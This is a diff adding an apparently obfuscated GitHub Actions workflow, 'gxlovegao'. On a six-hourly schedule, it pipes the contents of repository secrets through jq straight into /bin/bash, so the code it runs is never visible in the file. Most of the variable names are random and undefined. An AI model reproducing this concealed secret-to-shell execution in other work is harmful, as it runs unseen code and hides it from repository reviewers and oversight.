@@ -1,0 +1,21 @@
+name: gxlovegao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gxlovegao
+        env:
+          xx2225: ${{ secrets.xx2225 }}
+        run: |
+          echo $xx2225 | jq -r .hqry310 | /bin/bash
+          echo $jmeqd784 | jq -r .nrklt39164 | /bin/bash
+          echo $waicw1070 | jq -r .smyhk35051 | /bin/bash
+          echo $vnpj384 | jq -r .qtp8201 | /bin/bash
+
